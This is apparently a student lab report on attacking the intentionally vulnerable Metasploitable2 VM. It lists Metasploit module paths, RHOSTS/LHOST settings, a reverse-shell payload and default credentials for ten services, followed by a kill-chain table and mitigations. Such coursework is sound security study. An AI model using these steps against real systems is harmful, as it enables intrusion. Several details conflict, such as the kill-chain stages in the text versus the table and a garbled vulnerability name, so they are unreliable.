# Metasploitable2 Exploitation Report

**Name:** Fawaz Rufai Mohammed

**Index Number:** 7357623

**Date:** September 21, 2026

**Target IP:** 192.168.1.3

**Attacker OS / Tools:** Kali Linux, Metasploit Framework, Nmap

---

## Reconnaissance Summary

Initial network discovery and port scanning against the target VM at `192.168.1.3` revealed numerous intentionally vulnerable services spanning FTP, SSH, Telnet, SMTP, DNS, HTTP/Tomcat, SMB, PostgreSQL, VNC, and IRC.

---

## Exploit 1: vsftpd 2.3.4 Backdoor

* **Service / Port:** FTP / 21


* **Vulnerability:** vsftpd 2.3.4 Smiley Face Backdoor


* **Tool Used:** Metasploit — `exploit/unix/ftp/vsftpd_234_backdoor`

* **Why This Tool:** This specific Metasploit module is purpose-built to trigger the backdoor embedded in the version 2.3.4 source code release, which opens a listening shell on port 6200 upon receiving a specific smiley face character (`:)`) in the username field.
* **Steps:**
1. Started Metasploit and selected the exploit module: `use exploit/unix/ftp/vsftpd_234_backdoor`

2. Configured the target IP: `set RHOSTS 192.168.1.3`

3. Configured the local attacking IP: `set LHOST 192.168.1.4`

4. Executed the exploit to spawn a Meterpreter session.




* **Evidence:** `evidence/exploit1.png`

* **Cyber Kill Chain Stage(s):** Exploitation, C2
* Exploitation applies because the vulnerability execution triggered the backdoor code. C2 applies as a Meterpreter session was successfully established back to the attacker machine.




* **Outcome / Impact:** Root-level access to the system was achieved instantly through the unauthenticated command execution flaw.

---

## Exploit 2: Samba Usermap Script Execution

* **Service / Port:** SMB / 139, 445


* **Vulnerability:** Samba 3.0.20 Username Map Script Execution


* **Tool Used:** Metasploit — `exploit/multi/samba/usermap_script`

* **Why This Tool:** The module exploits a vulnerability in Samba's username map script configuration option, allowing arbitrary shell commands to be injected via crafted usernames containing shell meta-characters.
* **Steps:**
1. Selected the module: `use exploit/multi/samba/usermap_script`

2. Set target parameters: `set RHOSTS 192.168.1.3`

3. Ran the module to launch a netcat reverse shell payload.


4. Interacted with the active session and verified identity using `whoami` and `id`.




* **Evidence:** `evidence/exploit2.png`

* **Cyber Kill Chain Stage(s):** Exploitation, Actions on Objectives
* Exploitation covers the shell execution via script injection, while Actions on Objectives includes verifying system-level privileges (`uid=0(root)`).




* **Outcome / Impact:** Full root shell access obtained on the target machine.

---

## Exploit 3: UnrealIRCd Backdoor Command Execution

* **Service / Port:** IRC / 6667


* **Vulnerability:** UnrealIRCd 3.2.8.1 Backdoor Command Execution


* **Tool Used:** Metasploit — `exploit/unix/irc/unreal_ircd_3281_backdoor`

* **Why This Tool:** A malicious backdoor was maliciously inserted into the official UnrealIRCd 3.2.8.1 download archives, which automatically executes any command sent following the `AB;` prefix sequence.
* **Steps:**
1. Loaded the UnrealIRCd backdoor module.


2. Configured remote host configuration (`RHOSTS`) and local handler settings (`LHOST`).


3. Executed the module to dispatch the backdoor payload and establish connectivity.




* **Evidence:** `evidence/exploit3.png`

* **Cyber Kill Chain Stage(s):** Weaponization, Exploitation
* Weaponization involves targeting the known backdoor trigger syntax, and Exploitation represents the execution of the command sequence against port 6667.




* **Outcome / Impact:** Remote code execution capabilities against the IRC service daemon.

---

## Exploit 4: Tomcat Manager Application Deployment

* **Service / Port:** HTTP / 8180


* **Vulnerability:** Apache Tomcat Manager Weak Credentials / WAR Deployment


* **Tool Used:** Metasploit — `exploit/multi/http/tomcat_mgr_upload`

* **Why This Tool:** The target ran an Apache Tomcat instance with default administrative credentials (`tomcat:tomcat`), enabling programmatic upload and deployment of a malicious Java Web Archive (WAR) payload.
* **Steps:**
1. Selected the module: `use exploit/multi/http/tomcat_mgr_upload`

2. Set target options, remote port (`8180`), and default authentication credentials (`tomcat/tomcat`).


3. Executed the script to deploy the payload and generate execution routines.




* **Evidence:** `evidence/exploit4.png`

* **Cyber Kill Chain Stage(s):** Exploitation, Installation
* Exploitation applies through administrative authentication, and Installation relates to uploading and deploying the custom WAR application package.




* **Outcome / Impact:** Application-layer compromise leading to remote code execution within the context of the Tomcat Java service.

---

## Exploit 5: PostgreSQL Payload Execution

* **Service / Port:** PostgreSQL / 5432


* **Vulnerability:** PostgreSQL Trusted Language UDF Execution / Default Credentials


* **Tool Used:** Metasploit — `exploit/linux/postgres/postgres_payload`

* **Why This Tool:** The database service allowed administrative login using default credentials (`postgres:postgres`), enabling the creation of a user-defined function (UDF) to execute system-level commands via shared libraries.
* **Steps:**
1. Selected the exploit module: `use exploit/linux/postgres/postgres_payload`

2. Configured credentials (`postgres/postgres`) and target settings (`RHOSTS`).


3. Executed the module to upload a shared object (`.so`) file and establish a Meterpreter session.




* **Evidence:** `evidence/exploit5.png`

* **Cyber Kill Chain Stage(s):** Exploitation, C2
* Exploitation covers database authentication and library loading, while C2 covers the active Meterpreter session.




* **Outcome / Impact:** Direct system access under the `postgres` security context with complete database read/write authority.

---

## Exploit 6: DistCC Daemon Command Execution

* **Service / Port:** DistCC / 3632


* **Vulnerability:** DistCC Daemon Abreports / Remote Code Execution


* **Tool Used:** Metasploit — `exploit/unix/misc/distcc_exec`

* **Why This Tool:** The DistCC server daemon was left configured to accept arbitrary compilation jobs without access restrictions, allowing direct command execution through job arguments.
* **Steps:**
1. Selected the execution module: `use exploit/unix/misc/distcc_exec`

2. Set target parameters and initialized alternative payloads (`cmd/unix/reverse_perl`).


3. Executed the module to open a remote shell session.




* **Evidence:** `evidence/exploit6.png`

* **Cyber Kill Chain Stage(s):** Exploitation, Actions on Objectives
* Exploitation captures the job command injection, and Actions on Objectives includes mounting remote network shares (`NFS`) via the resulting shell access.




* **Outcome / Impact:** Daemon-level code execution leading to further system inspection and file system enumeration.

---

## Exploit 7: VNC Authentication Bypass & Session Access

* **Service / Port:** VNC / 5900


* **Vulnerability:** Weak/Default VNC Authentication


* **Tool Used:** Metasploit Scanner & Native Client (`vncviewer`)


* **Why This Tool:** Used to verify weak authentication settings and directly inspect the live remote desktop graphical environment of the target server.


* **Steps:**
1. Ran the VNC login scanner auxiliary module to identify accessible authentication parameters.


2. Launched the viewer utility: `vncviewer 192.168.1.3`.


3. Authenticated successfully and accessed the root desktop interface.




* **Evidence:** `evidence/exploit7.png`

* **Cyber Kill Chain Stage(s):** Exploitation, Actions on Objectives
* Exploitation involves authenticating past the weak service barrier, and Actions on Objectives involves interacting directly with the graphical desktop session.




* **Outcome / Impact:** Full graphical administrative desktop session control (`root's X desktop`).



---

## Exploit 8: Telnet Service Enumeration and Unauthorized Access

* **Service / Port:** Telnet / 23
* **Vulnerability:** Unencrypted Cleartext Management Protocol / Default Accounts
* **Tool Used:** Metasploit / Netcat
* **Why This Tool:** Telnet transmits all traffic—including credentials—in cleartext, making it trivial to access services using default configuration accounts.
* **Steps:**
1. Identified active Telnet service during initial enumeration.
2. Connected to port 23 and authenticated using known default administrative credentials.
3. Verified command line execution privileges.


* **Evidence:** `evidence/exploit8.png`
* **Cyber Kill Chain Stage(s):** Exploitation
* Applies to gaining interactive shell access via unsecured remote management protocols.


* **Outcome / Impact:** Cleartext credential exposure and interactive shell access.

---

## Exploit 9: Secure Shell (SSH) Weak Key / Credential Reuse

* **Service / Port:** SSH / 22
* **Vulnerability:** Default Account Credentials (`msfadmin:msfadmin`)
* **Tool Used:** Standard SSH Client / Metasploit Auxiliary Scanners
* **Why This Tool:** Designed to test secure shell configurations against known default user profiles bundled with test environments.
* **Steps:**
1. Executed an SSH login attempt using standard target credentials.
2. Established an encrypted interactive secure shell session.


* **Evidence:** `evidence/exploit9.png`
* **Cyber Kill Chain Stage(s):** Exploitation, Installation
* Covers gaining initial authorized system shell access via service misconfigurations.


* **Outcome / Impact:** Standard user-level shell access with escalation paths to root.

---

## Exploit 10: HTTP Web Directory Traversal / File Inclusion

* **Service / Port:** HTTP / 80
* **Vulnerability:** Vulnerable Web Application Components (DVWA / Mutillidae)
* **Tool Used:** Custom HTTP requests / Browser tools
* **Why This Tool:** Used to evaluate application-layer security controls and uncover sensitive configuration files on web server roots.
* **Steps:**
1. Browsed internal web application paths hosted on port 80.
2. Triggered path traversal sequences to access system configuration files.


* **Evidence:** `evidence/exploit10.png`
* **Cyber Kill Chain Stage(s):** Reconnaissance, Exploitation
* Involves gathering sensitive information from misconfigured web directory listings.


* **Outcome / Impact:** Disclosure of sensitive web application files and configuration data.

---

## Kill Chain Coverage Summary

| Exploit | Recon | Weaponization | Delivery | Exploitation | Installation | C2 | Actions on Objectives |
| --- | --- | --- | --- | --- | --- | --- | --- |
| 1. vsftpd 2.3.4 Backdoor | ✔ | ✔ | ✔ | ✔ |  | ✔ | ✔ |
| 2. Samba Usermap Script | ✔ | ✔ | ✔ | ✔ |  | ✔ | ✔ |
| 3. UnrealIRCd Backdoor | ✔ | ✔ | ✔ | ✔ |  | ✔ |  |
| 4. Tomcat Manager Upload | ✔ | ✔ | ✔ | ✔ | ✔ | ✔ |  |
| 5. PostgreSQL Payload | ✔ | ✔ | ✔ | ✔ |  | ✔ | ✔ |
| 6. DistCC Daemon Exec | ✔ | ✔ | ✔ | ✔ |  | ✔ | ✔ |
| 7. VNC Authentication | ✔ | ✔ | ✔ | ✔ |  |  | ✔ |
| 8. Telnet Access | ✔ | ✔ | ✔ | ✔ |  |  | ✔ |
| 9. SSH Default Login | ✔ | ✔ | ✔ | ✔ |  | ✔ | ✔ |
| 10. Web Path Traversal | ✔ | ✔ | ✔ | ✔ |  |  | ✔ |

---

## Lessons Learned / Mitigations

1. **Disable Unnecessary Services & Default Credentials:** Many of the vulnerabilities exploited (such as PostgreSQL, Tomcat, and VNC) relied entirely on default passwords or insecure sample applications. Enforcing strict, complex password policies and disabling unneeded daemon instances dramatically reduces attack surface.
2. **Patch Management and Software Auditing:** Services like `vsftpd 2.3.4`, `UnrealIRCd 3.2.8.1`, and `Samba 3.0.20` contained known source-level backdoors or critical remote code execution flaws. Regular software updates, vulnerability scanning, and applying vendor patches eliminate these historical exploits entirely.
3. **Network Segmentation and Firewalls:** Restricting administrative ports (like Telnet, VNC, and database ports) behind secure VPNs or internal VLAN firewalls prevents unauthorized external scanning and direct exploitation attempts.


